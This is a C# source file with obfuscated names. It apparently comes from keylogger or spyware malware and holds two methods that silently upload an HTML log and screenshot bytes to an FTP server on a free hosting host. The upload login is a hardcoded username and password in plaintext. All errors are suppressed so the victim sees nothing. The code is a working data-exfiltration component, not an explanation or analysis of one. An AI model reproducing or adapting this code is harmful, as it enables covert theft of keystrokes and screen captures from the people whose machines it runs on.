using System;
using System.IO;
using System.Net;
using System.Text;
using UHyll;

namespace irvZOqKmUZY
{
	public class JrK9ZW
	{
		public static void FTP_UploadAgentData(string ftpFileName, string logHtml)
		{
			try
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://files.000webhost.com" + " / " + ftpFileName);
				ftpWebRequest.Credentials = new NetworkCredential("tain00", "computer@2020");
				ftpWebRequest.Method = "STOR";
				byte[] bytes = Encoding.UTF8.GetBytes(logHtml);
				ftpWebRequest.ContentLength = (long)bytes.Length;
				using (Stream requestStream = ftpWebRequest.GetRequestStream())
				{
					requestStream.Write(bytes, 0, bytes.Length);
					requestStream.Close();
				}
			}
			catch
			{
			}
		}
		public static void FTP_UploadAgentScreen(byte[] memoryStream, string jpeg)
		{
			try
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://files.000webhost.com" + "/" + jpeg);
				ftpWebRequest.Credentials = new NetworkCredential("tain00", "computer@2020");
				ftpWebRequest.Method = "STOR";
				using (Stream requestStream = ftpWebRequest.GetRequestStream())
				{
					requestStream.Write(memoryStream, 0, memoryStream.Length);
					requestStream.Close();
				}
			}
			catch
			{
			}
		}
	}
}
